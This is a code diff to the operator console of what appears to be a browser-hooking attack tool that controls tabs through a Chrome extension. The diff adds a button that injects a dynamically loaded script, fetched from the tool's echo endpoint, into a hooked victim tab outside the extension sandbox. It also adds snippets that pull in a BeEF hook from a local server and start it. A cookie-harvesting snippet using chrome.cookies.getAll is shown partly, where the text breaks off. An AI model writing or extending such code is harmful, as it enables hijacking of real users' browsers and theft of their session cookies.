@@ -152,7 +152,8 @@ display:none;
                                                     </select>
                                                     <p class="help-block">Use __p.postMessage({cmd:'recveval', p: xxx}); to return results asynchronously.</p>
                                                     <textarea class=mono name=eval style="width: 100%; height: 100px" placeholder="alert(/place code to eval in this tab here/)"></textarea>
-                                                    <button id=eval type="button" class="btn btn-secondary">Eval <i title="Effect might be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+                                                    <button id=eval title="Evaluate code in Chrome content script sandbox - you can't call page original JS" type="button" class="btn btn-secondary">Eval<i title="Effect might be visible in hooked browser" class="icon-exclamation-sign"></i></button>
+                                                    <button id=eval-no-sandbox title="Try to evaluate code outside Chrome content script sandbox by attaching dynamic &lt;script&gt;. No results will be available." type="button" class="btn btn-secondary">Eval outside sandbox (experimental, blind) <i title="Effect might be visible in hooked browser" class="icon-exclamation-sign"></i></button>
                                                     </p>
                                                     <textarea class=mono style="width: 100%; height: 300px" id=eval-result placeholder="result will be placed here."></textarea>
                                                 </form>
@@ -589,8 +590,10 @@ $(function() {
 
     if (ws) {
         var hook_url = document.location.href.replace(/\/$/, '/hook');
+        var echo_js_url = document.location.href.replace(/\/$/, '/echo');
     } else {    
         var hook_url = document.location.href.replace('/console.html', '/hook.php');
+        var echo_js_url = document.location.href.replace('/console.html', '/echo.php');
     }
     
     $('.hook-url').each(function() {$(this).text($(this).text().replace(/__HOOK_URL__/g, hook_url)) });
@@ -615,6 +618,25 @@ $(function() {
             sendCmd('eval', $('[name=eval]').val(), {id: currentTab});
             $('#eval-result').val('');
         }
+    });
+
+    $('#eval-no-sandbox').click(function() {
+        // create dynamic script URL to load in page
+        if (!currentTab) {
+            al("No tab selected!");
+            return;
+        }
+        var wrapper = "(function() {\n\
+var d=document;\n\
+var s = d.createElement('script');\n\
+s.src = '__CODE__';\n\
+d.body.appendChild(s);\n\
+})();";
+        url = echo_js_url + '?c=' + encodeURIComponent($('[name=eval]').val()) + '&t=' + Math.random();
+        var code = wrapper.replace('__CODE__', url);
+
+        sendCmd('eval', code, {id: currentTab});
+        $('#eval-result').val('no results for blind requests...');
     });
 
     $('#report-html').click(function() {
@@ -727,7 +749,23 @@ for (i=0;i<document.scripts.length;i++) {\n\
 s.push(document.scripts[i].src || document.scripts[i].textContent);\n\
 }\n\
 s;';
-    ext_snippets = {};
+    snippets['add script'] = "(function() {\n\
+var d=document;\n\
+var s = d.createElement('script');\n\
+s.src = 'script.js';\n\
+d.body.appendChild(s);\n\
+})();";
+
+    snippets['BeEF init part 1'] = "(function() {\n\
+var d=document;\n\
+var s = d.createElement('script');\n\
+s.src = 'http://127.0.0.1:3000/hook.js'; // BeEF hook here\n\
+d.body.appendChild(s);\n\
+})();";
+
+    snippets['BeEF init part 2'] = "beef_init(); // run this outside sandbox";
+    
+    var ext_snippets = {};
     
     ext_snippets['get cookies'] = '//extension needs cookies permission\n\
 chrome.cookies.getAll({\n\
